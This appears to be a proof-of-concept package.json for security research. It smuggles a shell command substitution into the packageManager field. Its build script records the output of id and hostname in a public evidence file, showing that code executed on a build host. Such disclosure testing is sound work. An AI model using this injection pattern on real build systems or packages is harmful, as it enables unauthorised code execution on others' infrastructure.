{
  "name": "swr-final-poc999",
  "version": "1.0.0",
  "scripts": {
    "build": "mkdir -p public && id > public/evidence.txt && hostname >> public/evidence.txt && echo 'Success' > public/index.html"
  },
  "packageManager": "pnpm@https://example.com/$(id>public/evidence.txt)"
}
